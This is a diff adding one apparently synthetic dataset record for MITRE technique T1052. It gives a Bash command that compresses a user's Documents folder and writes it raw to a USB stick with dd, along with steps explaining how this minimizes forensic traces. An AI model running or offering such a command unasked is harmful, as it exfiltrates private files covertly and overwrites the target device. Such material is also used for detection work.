@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "tar -C \"$HOME\" -czf - Documents | dd of=\"/dev/disk/by-label/USBSTICK\" bs=4M oflag=direct,dsync iflag=fullblock status=none",
+  "explanation": "Packages the user's Documents directory and writes the compressed stream directly to the raw USB device by label, avoiding filesystem writes and metadata.",
+  "rationale_steps": [
+    "Create a compressed stream of target files with tar and gzip",
+    "Address the external drive using a stable by-label path",
+    "Write the stream directly to the raw device with dd using large blocks and direct I/O to minimize traces"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-4585860b-0fb052df",
+  "source_prompt_hash": "4585860b",
+  "timestamp_utc": "2025-09-30T05:09:05.177002Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
